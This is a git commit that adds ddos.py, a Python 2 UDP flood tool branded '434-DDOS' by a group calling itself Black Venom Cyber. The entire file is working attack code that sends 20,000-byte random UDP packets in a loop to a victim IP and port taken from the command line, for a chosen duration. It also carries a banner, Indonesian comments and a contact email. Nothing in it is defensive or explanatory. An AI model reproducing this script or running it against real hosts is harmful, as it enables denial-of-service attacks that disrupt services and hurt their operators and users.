f5e83f8a6047afb5674095511e7762edca8673d3
JafarArif <50292888+heytayo156@users.noreply.github.com>
2019-05-15 19:56:25 +0700

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,44 @@
+import time
+import socket
+import random
+import sys
+def usage():
+    print "\033[1;91m#########################################################"
+    print "#------------------------[\033[1;91m434-DDOS\033[1;32m]---------------------#"
+    print "#-------------------------------------------------------#"
+    print "#   \033[1;91mCommand: " "python2 ddos.py " "<ip> <port> <packet> \033[1;32m      #"
+    print "#                                                       # "
+    print "#\033[1;32mCreator:Squ4r3-B4D                                     #"
+    print "#\033[1;32mTeam   :BVC                                            #"
+    print "#\033[1;32mMail   :cyberontime1011@gmail.com                      #"
+    print "\033[1;91m#               \033[1;91m<--[Black Venom Cyber]-->               #"
+    print "#########################################################"
+    print "                        @@@@@@@@@@"
+    print "                       @@@@@@@@@@@@"
+    print "                     @@@@@@@@@@@@@@@@"
+def flood(victim, vport, duration):
+    # Support us yaakk... :)
+    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 20000 representasi satu byte ke server
+    bytes = random._urandom(20000)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
